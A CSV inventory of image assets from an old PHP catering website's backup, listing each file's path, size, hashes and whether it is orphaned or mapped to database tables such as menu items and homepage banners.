1742799570_stock-vector-holi-indian-festival-elements-with-family-celebrating-holi-festival-vector-editable-illustration-2426757723.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1742799570_stock-vector-holi-indian-festival-elements-with-family-celebrating-holi-festival-vector-editable-illustration-2426757723.jpg,150039,3945f68b408cbffb1650ac66c5029604f6cce3cf0688bdaf60659c62cb82fa91,5b68f5103d025704ce438175055cc69e,Static / Orphaned Disk Asset,,,,
1742828319_#Five Things to Look for When Hiring an Event Caterer.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1742828319_#Five Things to Look for When Hiring an Event Caterer.jpg,124531,0745815fe1053fee5643b1661d6bdb219df2feb937ecf84fdc94f93bec9c2d6d,8979257a47e7dd1cf8e2fff62f58576a,Static / Orphaned Disk Asset,,,,
1742878237_Vendor Image.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1742878237_Vendor Image.jpg,561277,99352a0477b36d4ade0c299c91e058e6aff95386a42faf4c3ab7c054820de9a1,7857b27804f1bd2cddd95b0380d99bb2,Static / Orphaned Disk Asset,,,,
1742900874_360_F_316912806_RCeHVmUx5LuBMi7MKYTY5arkE4I0DcpU.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1742900874_360_F_316912806_RCeHVmUx5LuBMi7MKYTY5arkE4I0DcpU.jpg,61957,ab87875c22bd4e1df1886b0bef54febe9c5a8e8965545ab1abcdd8fa692a4ba9,71cb4407b9a1f3f5a52dc9b25478bbb9,Static / Orphaned Disk Asset,,,,
1743936788_cloud-kitchen.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1743936788_cloud-kitchen.jpg,95776,6103cee7b8a5b0747781b138e97cd7bafe20e4ee68f5c352a38e43f6a2760a9e,0a1954961a579a0979f2c071636e5a9c,Static / Orphaned Disk Asset,,,,
1743936910_cloud-kitchen.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1743936910_cloud-kitchen.jpg,96233,94777f98924ff432163980c6592644c785ac302398264fa77fefc0192dd3d22e,16cf93cde3ef2224f43e4b1d5fdc83be,Static / Orphaned Disk Asset,,,,
1743936950_cloud-kitchen.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1743936950_cloud-kitchen.jpg,96233,94777f98924ff432163980c6592644c785ac302398264fa77fefc0192dd3d22e,16cf93cde3ef2224f43e4b1d5fdc83be,Static / Orphaned Disk Asset,,,,
1743937364_moms-kitchen.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1743937364_moms-kitchen.jpg,120390,b4752ec6918e65b378f175f4460030e2ed5d24ceed7ada384f6b8c473813597a,4697add0ebdca6c5b4712307a187faf5,Static / Orphaned Disk Asset,,,,
1743937442_moms-kitchen.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1743937442_moms-kitchen.jpg,120390,b4752ec6918e65b378f175f4460030e2ed5d24ceed7ada384f6b8c473813597a,4697add0ebdca6c5b4712307a187faf5,Static / Orphaned Disk Asset,,,,
1743937482_cloud-kitchen.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1743937482_cloud-kitchen.jpg,96233,94777f98924ff432163980c6592644c785ac302398264fa77fefc0192dd3d22e,16cf93cde3ef2224f43e4b1d5fdc83be,Static / Orphaned Disk Asset,,,,
1743937862_wedding-banquet.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1743937862_wedding-banquet.jpg,161044,fe957c7d3d11cc11b0bc647633ac7e9ee6bc74e44057f048446896bc5cd5a7d6,7afc420c4a52e3703d5498ce96c1dc76,DB Mapped (Verified),homepage_banner,7,Banquet and Destination<br> Venue,homepage_img
1743937955_cloud-kitchen.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1743937955_cloud-kitchen.jpg,96233,94777f98924ff432163980c6592644c785ac302398264fa77fefc0192dd3d22e,16cf93cde3ef2224f43e4b1d5fdc83be,DB Mapped (Verified),homepage_banner,10,Cloud Kitchen & Caterers,homepage_img
1743938041_moms-kitchen.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1743938041_moms-kitchen.jpg,120390,b4752ec6918e65b378f175f4460030e2ed5d24ceed7ada384f6b8c473813597a,4697add0ebdca6c5b4712307a187faf5,DB Mapped (Verified),homepage_banner,8,.,homepage_img
1747673367_bhaaji.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1747673367_bhaaji.jpg,110714,7e0363a573d20a7489236d94092d0dafb7e005d2dcdc9d9edf85851d5e4588c3,e5075de0b4f03a331ee4735367273708,Static / Orphaned Disk Asset,,,,
1747673487_bhaaji.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1747673487_bhaaji.jpg,109053,7913942c9545abbc1c2d2c70c23d6c5ea86c9f9ce4eb64f00a2a4c264804a8b0,bb088227dd582994e080de5c3a3ecade,Static / Orphaned Disk Asset,,,,
1747673578_bhaaji.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1747673578_bhaaji.jpg,126327,480f6bf51ef95da1bdd5eaee0615b87dda787dbe66a7c6424c3b45cf954c67b8,f0f3edd5725623779dc60f232a5ba3aa,Static / Orphaned Disk Asset,,,,
1747673623_bhaaji.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1747673623_bhaaji.jpg,109053,4c4f1282aa81dad51f1d89786005bb264109939445bddc49168717ef91a33d6b,e0000c6c2cdb2dcf156935085ff3b7fb,Static / Orphaned Disk Asset,,,,
1754385941_1747673623_bhaaji_resized.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1754385941_1747673623_bhaaji_resized.jpg,96886,cd3b9e70b0f2a77aff171a2f9561b20b2ef42a8211407638ad204cc759782c00,460f3bf0e75bb44d8f4f581edc9cc92f,Static / Orphaned Disk Asset,,,,
1754392849_1747673623_bhaaji_resized (1).jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1754392849_1747673623_bhaaji_resized (1).jpg,192143,05ae639238f1629fada160c7851272abb33ec96e317d0fcbf7fabe9b00d2e5fd,5f4d2c50666755512a74301d1b59413f,Static / Orphaned Disk Asset,,,,
1754395474_1747673623_bhaaji_resized (1).jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1754395474_1747673623_bhaaji_resized (1).jpg,192143,05ae639238f1629fada160c7851272abb33ec96e317d0fcbf7fabe9b00d2e5fd,5f4d2c50666755512a74301d1b59413f,Static / Orphaned Disk Asset,,,,
1754396251_1747673623_bhaaji_fixed.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1754396251_1747673623_bhaaji_fixed.jpg,97981,f9d253e92c89c5864d1c3863a546ae93608d55e0f5f341838d3cb1fa6e198912,8915a5ed13deb938c758c931da7f9b2e,Static / Orphaned Disk Asset,,,,
1754396458_1747673623_bhaaji_top_padding_color_match.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1754396458_1747673623_bhaaji_top_padding_color_match.jpg,100338,4a7e708b72cd2a6f430f1c970108510e4f64c0f632b8bdd604947d003626bc27,65fc82283df518e96e415e721b0686d0,Static / Orphaned Disk Asset,,,,
1754396572_1747673623_bhaaji.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1754396572_1747673623_bhaaji.jpg,109053,4c4f1282aa81dad51f1d89786005bb264109939445bddc49168717ef91a33d6b,e0000c6c2cdb2dcf156935085ff3b7fb,Static / Orphaned Disk Asset,,,,
1754396695_1743937862_wedding-banquet.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1754396695_1743937862_wedding-banquet.jpg,161044,fe957c7d3d11cc11b0bc647633ac7e9ee6bc74e44057f048446896bc5cd5a7d6,7afc420c4a52e3703d5498ce96c1dc76,Static / Orphaned Disk Asset,,,,
1754396722_1747673623_bhaaji.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1754396722_1747673623_bhaaji.jpg,109053,4c4f1282aa81dad51f1d89786005bb264109939445bddc49168717ef91a33d6b,e0000c6c2cdb2dcf156935085ff3b7fb,Static / Orphaned Disk Asset,,,,
1756900141_tfh-banner.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1756900141_tfh-banner.jpg,110961,8fa7d8524c52b3b84da3a32e050bcd74a5b36e1c7c1c6714fc44dac05b37ebbd,2d1de18032609f04d5b9490a02562f81,Static / Orphaned Disk Asset,,,,
1756900216_tfh-banner.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1756900216_tfh-banner.jpg,85838,b575393263d514667b662e2ce03e2a1610b994756d2f207900cd5e188866b3f1,020dc6fc99678dda01a408e3df5c44da,Static / Orphaned Disk Asset,,,,
1756900311_tfh-banner.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1756900311_tfh-banner.jpg,107280,82bc53ce786d66d607bcdbe5e9b1f309e23645c2d03d2a884cf778463f5b56d5,7dc96c52d457dec7476d1391d4bcf7c2,Static / Orphaned Disk Asset,,,,
1756900378_tfh-banner.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1756900378_tfh-banner.jpg,105181,c11777a70d2e631a6ebd194154412e27febcbfd850c10019f9c34e9360a5d5e2,4f0783cdbaf23ade76da7f2c147f0934,Static / Orphaned Disk Asset,,,,
1756917620_tfh-banner.webp,old-website-php/Full-website-backup/frontEnd/hpbanner/1756917620_tfh-banner.webp,71426,bc8ccd0782cb25448ebba83b4050c2dbe8942df5ceb66f46b73aeca89000b882,a3585c3289fc88024a859b3e59534174,Static / Orphaned Disk Asset,,,,
1756917893_tfh-banner.webp,old-website-php/Full-website-backup/frontEnd/hpbanner/1756917893_tfh-banner.webp,129664,d40b8dec5899295631fa7786c134a23d8598f9ebd99fd58d585cc6a293a934fb,c626014adc6e6d216447932a6ddc272e,DB Mapped (Verified),homepage_banner,9,.,homepage_img
2.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/2.jpg,9504,6334e633fdb43ffd54a4bf3e71df17279295ec7899872db459e294b6407a0493,4d482812d388e1cc1d017e22e34b2760,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/2.jpg,9504,6334e633fdb43ffd54a4bf3e71df17279295ec7899872db459e294b6407a0493,4d482812d388e1cc1d017e22e34b2760,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_small_img
2.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/2.jpg,9504,6334e633fdb43ffd54a4bf3e71df17279295ec7899872db459e294b6407a0493,4d482812d388e1cc1d017e22e34b2760,DB Mapped (Verified),product_item_tbl,2,Gujrati Kachori,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/2.jpg,9504,6334e633fdb43ffd54a4bf3e71df17279295ec7899872db459e294b6407a0493,4d482812d388e1cc1d017e22e34b2760,DB Mapped (Verified),website_gallery,2,Images 2,gimage
2.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/2.jpg,9504,6334e633fdb43ffd54a4bf3e71df17279295ec7899872db459e294b6407a0493,4d482812d388e1cc1d017e22e34b2760,DB Mapped (Verified),recipe_appliances_kits,2,Black Pepper Powder,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/2.jpg,9504,6334e633fdb43ffd54a4bf3e71df17279295ec7899872db459e294b6407a0493,4d482812d388e1cc1d017e22e34b2760,DB Mapped (Verified),event_cuisine,2,North Indian,cuisine_img
4.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/4.jpg,9080,e4a2c3a59ca420bd9d722a2a8824a92ba3c276049f2e3d5f0838779574255d48,fa7dc881fc213e837a4add8c10c3aaf2,DB Mapped (Verified),menu_item_tbl,4,Sambhar,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/4.jpg,9080,e4a2c3a59ca420bd9d722a2a8824a92ba3c276049f2e3d5f0838779574255d48,fa7dc881fc213e837a4add8c10c3aaf2,DB Mapped (Verified),product_item_tbl,4,Loose Mitthi Matthi,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/4.jpg,9080,e4a2c3a59ca420bd9d722a2a8824a92ba3c276049f2e3d5f0838779574255d48,fa7dc881fc213e837a4add8c10c3aaf2,DB Mapped (Verified),website_gallery,4,Images 4,gimage
4.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/4.jpg,9080,e4a2c3a59ca420bd9d722a2a8824a92ba3c276049f2e3d5f0838779574255d48,fa7dc881fc213e837a4add8c10c3aaf2,DB Mapped (Verified),recipe_appliances_kits,4,Spatula,kits_img
4.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/4.jpg,9080,e4a2c3a59ca420bd9d722a2a8824a92ba3c276049f2e3d5f0838779574255d48,fa7dc881fc213e837a4add8c10c3aaf2,DB Mapped (Verified),event_cuisine,4,Flame Grilled to Perfection,cuisine_img
BanquetHall.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/BanquetHall.jpg,1064331,1cb1cea554d3fc08bb4c5e77f63b64d6634c4870950614f52cd5cd855d8b1a65,97e9743773288a9fd319f10a5bbee64f,Static / Orphaned Disk Asset,,,,
banquet_hall.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/banquet_hall.jpg,867390,211a93e15807aa5fc98d0be8c4ba848dc163fa06e013cfa77fe70fb3954d4e10,c6474691757d457de8f98fe3354b4c9b,Static / Orphaned Disk Asset,,,,
CloudKitchenCatering.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/CloudKitchenCatering.jpg,433700,7443809e92dd40e1f17e5f6b5bb8e84979abc283ad6db540a16e25d77daefa3f,7365bdef94b740b26b54cddb10bfa023,Static / Orphaned Disk Asset,,,,
Food.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/Food.jpg,374354,fd16f92bf9479525581a798eafe859611da68ca6ead65d13526323d673cfaab1,ce3730880f1258334a59008b894f0ce2,Static / Orphaned Disk Asset,,,,
FoodHome.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/FoodHome.jpg,763622,ad635d9b2ba865e86ea2fded09dc5f34dcd6c8336473e74f10eb162e7f123a0f,f882324a1efe4ad23adc5fd60402f0be,Static / Orphaned Disk Asset,,,,
FoodService_hlwai.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/FoodService_hlwai.jpg,406473,ddafc9cc8eec8f67c13df309b42a11f3e8479d57e99cac7feec8020f043a0c2d,959ad71809e99e720841cfd0fa450fbd,Static / Orphaned Disk Asset,,,,
Manpower.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/Manpower.jpg,504826,69660fd40c3a5531900e21c421158bdb138d9e89dd3cb6ac44c35aa58385efae,87aa1eb33ce78883fe11117ba38b5b8f,Static / Orphaned Disk Asset,,,,
man_power.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/man_power.jpg,338616,e056a62f6ac6a84ff60c9b9e0aa199e87fb7ae61347cc694d0c9e58c25e7ec35,cb7a85ccf231d9afd83da698c141246a,Static / Orphaned Disk Asset,,,,
mommagic_tiffin_achar.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/mommagic_tiffin_achar.jpg,547866,f151f522b5590358a306b453d202b0940525037b63a8f7d20c689674f53971b8,53b5c0c50b0de5cf4ccb94ce4c451563,Static / Orphaned Disk Asset,,,,
testimonial-banner.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/testimonial-banner.jpg,107523,2adb6ef40b15b019023b9f91776cf0582a043a6cdf25787ebb62264adec46f6f,c7caa85c8e422e3d55aaba48778835c1,Static / Orphaned Disk Asset,,,,
BanquetHall.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/OLD/BanquetHall.jpg,1064331,1cb1cea554d3fc08bb4c5e77f63b64d6634c4870950614f52cd5cd855d8b1a65,97e9743773288a9fd319f10a5bbee64f,Static / Orphaned Disk Asset,,,,
CloudKitchenCatering.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/OLD/CloudKitchenCatering.jpg,506625,23b5f8bfa645bf3126e8878be8932114b5cff0c7464f35312ef563bba93f7cf7,5cc01d954253653d50b4d4494c9bfd4a,Static / Orphaned Disk Asset,,,,
FoodHome.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/OLD/FoodHome.jpg,763622,ad635d9b2ba865e86ea2fded09dc5f34dcd6c8336473e74f10eb162e7f123a0f,f882324a1efe4ad23adc5fd60402f0be,Static / Orphaned Disk Asset,,,,
3dcall.png,old-website-php/Full-website-backup/frontEnd/images/3dcall.png,26022,6e24c4c9cc4ce2453544567bc27099a2b14dc95b4e61e027a837921b27d0ca48,2924fd8f668caeea1a321979f1c5c45b,Static / Orphaned Disk Asset,,,,
Ad Banner.png,old-website-php/Full-website-backup/frontEnd/images/Ad Banner.png,297371,9bf41716620eaa4553bf70b8f8c1fe4591674dce25d5bd7994410fb3b3d7323c,67ba0fb2342b6f6bdec07409fa71745f,Static / Orphaned Disk Asset,,,,
appstor.png,old-website-php/Full-website-backup/frontEnd/images/appstor.png,5273,cd04f1df1653fe35f72333dfd64d9ed83fad180bec78b89286760b81c696792b,25fc28d4bd518f48309cedccd8129652,Static / Orphaned Disk Asset,,,,
aqute.png,old-website-php/Full-website-backup/frontEnd/images/aqute.png,441,4915367f29f6ce4c03b5642d96e4d1ffbe066372fd554f9680f714ad771edfdd,aa3bf12febd9dd8d541a6944acd35954,Static / Orphaned Disk Asset,,,,
arrow-c.png,old-website-php/Full-website-backup/frontEnd/images/arrow-c.png,235,5f5f6623675fc21556327dec2c9d9b02f5867813e1557aa606f0e38b4326b8ea,ca9f4613e28c12b645d0e49f6f447fa6,Static / Orphaned Disk Asset,,,,
arrow.png,old-website-php/Full-website-backup/frontEnd/images/arrow.png,302,d36ed5fdfbe5c8ca8fd4cc5d61a20481032cfd2329eedf35bb98d45139a00de0,354b1427a4d6dbaa2cd1ea59dc5c4a83,Static / Orphaned Disk Asset,,,,
arrows.png,old-website-php/Full-website-backup/frontEnd/images/arrows.png,2276,f252fe5063fbe60837b3dcf7e0a407378a8288fb34526e55fad7cc34d3111ac2,a0b0d698e303261166a16351c0bcd1c1,Static / Orphaned Disk Asset,,,,
bar-tender.png,old-website-php/Full-website-backup/frontEnd/images/bar-tender.png,8259,5e29bb37d9e318aa3c21521b2ca225747abce1d5fc85e154853ee4412990c2de,c3aad20ea369d184589de26680c2c30b,Static / Orphaned Disk Asset,,,,
bhaidooj.png,old-website-php/Full-website-backup/frontEnd/images/bhaidooj.png,163706,dd943828407275d2d311eac078741e5390304ef56b478434130a9ce1d960abe9,99e16198dd59fa2b352d9ca4516a46ab,Static / Orphaned Disk Asset,,,,
birthday.png,old-website-php/Full-website-backup/frontEnd/images/birthday.png,908344,4562606f26f73c6beef9919642644bf82d73df4a2eef0b518be861fe3d640262,833ef9f64f6cbb88eac423d0f78c1924,Static / Orphaned Disk Asset,,,,
calender.png,old-website-php/Full-website-backup/frontEnd/images/calender.png,1102,e0c56e1defd4d50bab4f5330bd5e87bcf30084bebb5846ddc4eccedc7a3de0a5,20d4083e0f6f9ca1735ebd581e0a083a,Static / Orphaned Disk Asset,,,,
call-icon-2.png,old-website-php/Full-website-backup/frontEnd/images/call-icon-2.png,499,c8e536745aa78f352167ec85dd358f08906da4a6c6edb0c64b96387611a546b6,a7d058402dd94744f87fa3a099a75e97,Static / Orphaned Disk Asset,,,,
call-icon.png,old-website-php/Full-website-backup/frontEnd/images/call-icon.png,416,834f3bf94252d51f2547df7618e0b63fc6ec78a120f8e6a850d5c676808c548d,e3ebf22a85db2f6c4b8b98f865ae00ca,Static / Orphaned Disk Asset,,,,
cart.png,old-website-php/Full-website-backup/frontEnd/images/cart.png,2713,48736597e6306b62c29d0236576435ab6840da09fc641ad4f525e2268b83755f,1d14d9243d5be9ed6e88c1525add9103,Static / Orphaned Disk Asset,,,,
ch-star.png,old-website-php/Full-website-backup/frontEnd/images/ch-star.png,411,0536039b1a6a6ffc2dcca22833e56ed0d62116bb28d4b5f9038df3b7416e2f88,0b36b5aa510707bd960a48ced24c5888,Static / Orphaned Disk Asset,,,,
ch-start5.png,old-website-php/Full-website-backup/frontEnd/images/ch-start5.png,4837,628949dfd6e89c30921bbc55bce33fc04d5eeebee3d8488f0949648a31eda101,07066208019545e67ff4290a50b20fd0,Static / Orphaned Disk Asset,,,,
ch1.png,old-website-php/Full-website-backup/frontEnd/images/ch1.png,51844,1db3083896346cfca8f60c087995ac49dd7d2c6c991ff3d6c02a37996cefc643,be70139e9123645ac71e62272a546fc3,Static / Orphaned Disk Asset,,,,
ch2.png,old-website-php/Full-website-backup/frontEnd/images/ch2.png,52120,b89c4b7ad88c0e169a7cdf91b6555f640cf16987dd599f582b0c642d2b32d551,ea9009c92d9e9e2310ad7d6f4b0fd789,Static / Orphaned Disk Asset,,,,
ch3.png,old-website-php/Full-website-backup/frontEnd/images/ch3.png,51844,1db3083896346cfca8f60c087995ac49dd7d2c6c991ff3d6c02a37996cefc643,be70139e9123645ac71e62272a546fc3,Static / Orphaned Disk Asset,,,,
ch4.png,old-website-php/Full-website-backup/frontEnd/images/ch4.png,52096,66bf7b010f7d1f7aaec9c033a0350c1d711a5a044f706515992c4e9a73e4428e,1755394697b3b700e08d9f7ca10e053c,Static / Orphaned Disk Asset,,,,
check.png,old-website-php/Full-website-backup/frontEnd/images/check.png,3742,bff48d9a923bc701c3fff54205f37f66e569b4d24290c12792cb8462110425fb,54d87fcc4d89c96c591f784ad372f4f3,Static / Orphaned Disk Asset,,,,
christmas.png,old-website-php/Full-website-backup/frontEnd/images/christmas.png,172289,a8c05d7a78be5b88e8fc5daca12cb4c155462c81c50d8e36d0503b0312c48d46,48b8d142775896cfb5f2f1a0b04896b8,Static / Orphaned Disk Asset,,,,
cleaner.png,old-website-php/Full-website-backup/frontEnd/images/cleaner.png,10073,284874e3133253fc6a9367591f3938b6b25fea05666b19ce463f0980ea228323,f09555e834ed17ee7a789e1d52370b06,Static / Orphaned Disk Asset,,,,
cook.png,old-website-php/Full-website-backup/frontEnd/images/cook.png,6900,c4cd2a0d7685a36d1d42c29fbf7f171649167aae45ecfb54598c806c9225f359,b17005466f1cd1c2a4a8580d65679721,Static / Orphaned Disk Asset,,,,
d1.jpg,old-website-php/Full-website-backup/frontEnd/images/d1.jpg,162106,c25e2dc71724548ac4837b27610b6fb701c21a026438258fb7ac392c7ebd6507,23adc58859811ff8a169cbbcf97a5e03,Static / Orphaned Disk Asset,,,,
d1.png,old-website-php/Full-website-backup/frontEnd/images/d1.png,240403,b9e4b40a869988c3000bc437a395d552f88e80c6ad82ffef59662c5fc72a220a,e1c719b106a6212e7ffe1e1198177db1,Static / Orphaned Disk Asset,,,,
d10.png,old-website-php/Full-website-backup/frontEnd/images/d10.png,160156,0cfce4ef33124aaf66a6aa6046f2d899f67966826effc015bba3dcafc0518042,ad49dd51db2a2d9a9a4f3fec21f03e25,Static / Orphaned Disk Asset,,,,
d2.jpg,old-website-php/Full-website-backup/frontEnd/images/d2.jpg,511296,3d098d6abb8a0d9262868d7f670ed12d2abf99d867bf60896ae9a04d9140230d,803e9c5026b9802ca271be38778404cf,Static / Orphaned Disk Asset,,,,
d2.png,old-website-php/Full-website-backup/frontEnd/images/d2.png,279566,e9309faa50d7d8e91d8d21cd07165283f9ec9791d91220f91770745f065c357b,63cd664695b41aab48c9820581598feb,Static / Orphaned Disk Asset,,,,
d3.jpg,old-website-php/Full-website-backup/frontEnd/images/d3.jpg,135558,fa3ae14283c172c27a59cb369dea12fd100331fa1e113f3a5e66ecba5d69ea48,6f4a187d1f1fa2c81618ef0cf6635d9a,Static / Orphaned Disk Asset,,,,
d3.png,old-website-php/Full-website-backup/frontEnd/images/d3.png,192698,bdb7e6c7cf9fa773fef078cfc5cee8927285aa84f96fbd5eca4510a76c4e4b5a,69431b27c61485aaea29b37a1c2e60e3,Static / Orphaned Disk Asset,,,,
d4.jpg,old-website-php/Full-website-backup/frontEnd/images/d4.jpg,157246,5ca4839bb4a64092078a2bdd20aac78c6da2b8d6a9d46781cefdd1a52875e2e6,dc5afdbe87453609673ff893b4e69b52,Static / Orphaned Disk Asset,,,,
d4.png,old-website-php/Full-website-backup/frontEnd/images/d4.png,210204,3db04176bce6abd67b88ee6f92f991f1f8cae04e039acd3fb6b602950142b541,d49ffb2ba0bc5290df2cb49d1d42ba4a,Static / Orphaned Disk Asset,,,,
d5.jpg,old-website-php/Full-website-backup/frontEnd/images/d5.jpg,131072,abe5a1b9ff4c1ac583dfa7ededa41a5cb5f62030884fe9862652f89a6f856edd,13b4cadd078268058b42d73029ada832,Static / Orphaned Disk Asset,,,,
d5.png,old-website-php/Full-website-backup/frontEnd/images/d5.png,84726,17231f3c761cc8ed6688bd9b8c7f65097b3b279ec25f84349190e383887519d2,d2fc97ff1fff9d90a87010ee8b2fd2d8,Static / Orphaned Disk Asset,,,,
d6.jpg,old-website-php/Full-website-backup/frontEnd/images/d6.jpg,183483,099854eea2de3a6f3a1b2188496cc3f69cc51ccaea652b5e2c53ef7e800d5518,4725ec70a87f8e731368d2508d79d026,Static / Orphaned Disk Asset,,,,
d6.png,old-website-php/Full-website-backup/frontEnd/images/d6.png,197683,f1bbe16b1612b572d1366dbd33064d8a2cd515d1c5efcd5982007a659f9b7be6,3a4edefb401fe34f057c17e4f4369119,Static / Orphaned Disk Asset,,,,
d7.jpg,old-website-php/Full-website-backup/frontEnd/images/d7.jpg,247847,cac32480501cc42a0dda9d646b86327b931afcfa1e3b329fb4395798f462fa1e,0526248b0177e82d04311b21e9460095,Static / Orphaned Disk Asset,,,,
d7.png,old-website-php/Full-website-backup/frontEnd/images/d7.png,146367,b46fae3251205540d200d39f8f2a183288d1d2be3b31dd6318d271190e01f46b,56812cd536deb2facf1b712ebdcf055a,Static / Orphaned Disk Asset,,,,
d8.jpg,old-website-php/Full-website-backup/frontEnd/images/d8.jpg,218085,122d9688e92b438a00622c8e9a080aa5b9edaeb94945fe3180a1918d1cf6be75,6dce1c3330305f784aa5747c9a8b9fc3,Static / Orphaned Disk Asset,,,,
d8.png,old-website-php/Full-website-backup/frontEnd/images/d8.png,254704,7961d35f5af3f921c3a6cb9a41685baed367b8f2e79155bc89ed743c95d9fe81,4154886debf7f44ffc7f01def89b7138,Static / Orphaned Disk Asset,,,,
d9.png,old-website-php/Full-website-backup/frontEnd/images/d9.png,246747,ba521bc570b8e9a2186386bc44980fd36f8c68aab8c2db5ea066680118ce5b5d,7f2353db62fcd945c252de03e1965001,Static / Orphaned Disk Asset,,,,
delhi.jpeg,old-website-php/Full-website-backup/frontEnd/images/delhi.jpeg,2319,5881da75a9d458855702ede4d8fa7fb5d70c40a46a49da7ee743fce91ff52196,ed507a2d83b1634162b8ada8a080f614,Static / Orphaned Disk Asset,,,,
discount1.png,old-website-php/Full-website-backup/frontEnd/images/discount1.png,188674,5a3f228b2e01fd24f78dd4ecee1a2e8441660be4f31b0e504281903732d8e173,c34dec6a53302fb972bf5e110fa0c5ae,Static / Orphaned Disk Asset,,,,
discount2.png,old-website-php/Full-website-backup/frontEnd/images/discount2.png,180075,b4e176c47fb7a4203372c6bcf305512493df106925e5a863d18d21a950c20df9,88877761b5d0116ae4ec0a58286407b2,Static / Orphaned Disk Asset,,,,
discount3.png,old-website-php/Full-website-backup/frontEnd/images/discount3.png,170970,0a139fddc1f57bf1686e10a7a403b78fce92c053e36c2482e05db270fa30c6a1,7efc0f4a1dcd122109cd9ffd1668e80e,Static / Orphaned Disk Asset,,,,
discount4.png,old-website-php/Full-website-backup/frontEnd/images/discount4.png,240663,71cc8b011fc36c5bc3eb514a009a334c31946c144b63f9f2d718236fb0aeb644,241885bf2ab6db4461f0897e73d917e9,Static / Orphaned Disk Asset,,,,
diwali.png,old-website-php/Full-website-backup/frontEnd/images/diwali.png,116353,76c841196c7d0aa0cd702c17e67a516278a3e5b3e0e2519fce579b1ad7ef026f,705dfeaade58a35eb1d7e349aacbbdab,Static / Orphaned Disk Asset,,,,
down-arrow.png,old-website-php/Full-website-backup/frontEnd/images/down-arrow.png,1051,d2481fa85612ff79a555018c87eb7582e552df405306c1f9bcf6f86fa76717e6,1be23204173193dfa0c46319850fc622,Static / Orphaned Disk Asset,,,,
ebanner.jpg,old-website-php/Full-website-backup/frontEnd/images/ebanner.jpg,246942,614d6f3a2b7286aa692bd7bfacc197ceae2d0af94972a9bace4b6553222282f4,43e86ddf7fee2aff0a93a7beded7af2e,Static / Orphaned Disk Asset,,,,
Facebook.png,old-website-php/Full-website-backup/frontEnd/images/Facebook.png,3008,7f5d579a35bc2fc2f8b7d9cad3e8a59e640e2e35a826a20f6b70c6bf565ed880,8d9c866cf996256dfdad89170afdc049,Static / Orphaned Disk Asset,,,,
food-img.jpg,old-website-php/Full-website-backup/frontEnd/images/food-img.jpg,7068,1199044efe47db94cf5e1ee8cf8d831291754bf036d4a8be554ac1fdf4eefde2,a36624b43e5d7c4eff828fbef5615bbe,Static / Orphaned Disk Asset,,,,
foodcart.jpg,old-website-php/Full-website-backup/frontEnd/images/foodcart.jpg,11817,9247755350ec53ee912380a5237c398e5862e837e1f148cab96f73dfef0afa5e,ca7b0aaecc0c8d72bb02ee4bdc0ceceb,Static / Orphaned Disk Asset,,,,
g-rating.png,old-website-php/Full-website-backup/frontEnd/images/g-rating.png,5916,9fafa97717278ececf71a2c5f361944ab1783104205e3166d7d3242f6f783f8c,1878dc10c24cbab3b64b1397085d787a,Static / Orphaned Disk Asset,,,,
h4-bg-2.png,old-website-php/Full-website-backup/frontEnd/images/h4-bg-2.png,94991,6055f60325348e1218c8e9259ec88588f071f6a241e1ecab701359f043b92ee5,8f448e4d0bbbf78129df01723c51bc9a,Static / Orphaned Disk Asset,,,,
